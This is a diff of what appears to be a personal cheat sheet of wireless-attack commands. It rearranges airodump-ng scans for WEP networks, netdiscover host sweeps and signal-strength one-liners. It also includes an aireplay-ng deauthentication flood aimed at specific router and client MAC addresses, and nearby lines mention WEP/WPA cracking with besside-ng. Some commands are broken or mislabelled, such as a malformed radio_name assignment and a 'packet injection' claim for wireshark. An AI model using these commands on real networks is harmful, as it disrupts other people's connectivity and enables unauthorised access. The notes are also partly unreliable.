@@ -95,20 +95,37 @@ john --format=zip hash.txt
 #### MANGLED TTYL (FREE WIFI AP ACCESS) ######
 
 
-radio_name = $(iw dev | awk) '$1=="Interface"{print $2}'
 
-#### AIRMON-NG // SUITE ### 
+#################### AIRMON-NG // SUITE #######################
+###############################################################
+radio_name = $(iw dev | awk) '$1=="Interface"{print $2}'
 sudo airodump-ng wlx0013eff5483f  ## fo rmonitoring 
 airodump-ng wlx0013eff5483f --encrypt wep
 airodump-ng wlx0013eff5483f -c 11 ## TO BROADCAST ESSID 
 airodump-ng wlx0013eff5483f -c 11 & wireshark ## TO BROADCAST ESSID and use wireshark for packet injection 
 
 
+airodump-ng wlx0013eff5483f --encrypt wep
+airodump-ng wlx0013eff5483f -c 11
+netdiscover -r 192.168.50.1/24
+airodump-ng wlx0013eff5483f --encrypt wep
+sudo iwlist wlx0013eff5483f scanning | egrep 'Cell |Encryption|Quality|Last beacon|ESSID'
 
+#### TO GET DEVICES AND DISTANCE
+sudo iw dev wlx0013eff5483f scan | egrep "signal:|SSID:" | sed -e "s/\tsignal: //" -e "s/\tSSID: //" | awk '{ORS = (NR % 2 == 0)? "\n" : " "; print}' | sort
+##### TO FIND WEP PROTECTION ####
+airodump-ng wlx0013eff5483f --encrypt wep
 aireplay-ng -0 0 mac -c mac_of_radio radio_name 
 airemon-ng start external_radio 6 # the number is the channel  (TO START MONITOR MODE) 
 kismet -c radio_name  ## GETS THE MAC ADDRESS 
 
+
+## send deauth
+#1 find mac for router (-a) and client (-c)
+netdiscover -r 192.168.50.1/24
+aireplay-ng --deauth 90000000 -a F0:2F:74:2C:7E:88 -c 9a:26:55:ed:ef:84 wlo1
+
+###########################
 ### IFRENAME ### 
 ifrename # to rename wireless 
 iwevent # display wireless events 
@@ -241,18 +258,6 @@ sudo nmap -sV --scripts=vulscan xxxx
 #############################
 
 
-airodump-ng wlx0013eff5483f --encrypt wep
-airodump-ng wlx0013eff5483f -c 11
-netdiscover -r 192.168.50.1/24
-airodump-ng wlx0013eff5483f --encrypt wep
-sudo iwlist wlx0013eff5483f scanning | egrep 'Cell |Encryption|Quality|Last beacon|ESSID'
-
-#### TO GET DEVICES AND DISTANCE
-sudo iw dev wlx0013eff5483f scan | egrep "signal:|SSID:" | sed -e "s/\tsignal: //" -e "s/\tSSID: //" | awk '{ORS = (NR % 2 == 0)? "\n" : " "; print}' | sort
-
-##### TO FIND WEP PROTECTION ####
-airodump-ng wlx0013eff5483f --encrypt wep
-
 
 
 
@@ -356,10 +361,6 @@ tshark -i wlx0013eff5483f
 tshark -i wlx0013eff5483f -i any (## all interfaces)
 
 
-## send deauth
-#1 find mac for router (-a) and client (-c)
-netdiscover -r 192.168.50.1/24
-aireplay-ng --deauth 90000000 -a F0:2F:74:2C:7E:88 -c 9a:26:55:ed:ef:84 wlo1
 
 ### CRACKING WEP / WPA ####
 besside-ng en0 -c 6 -b
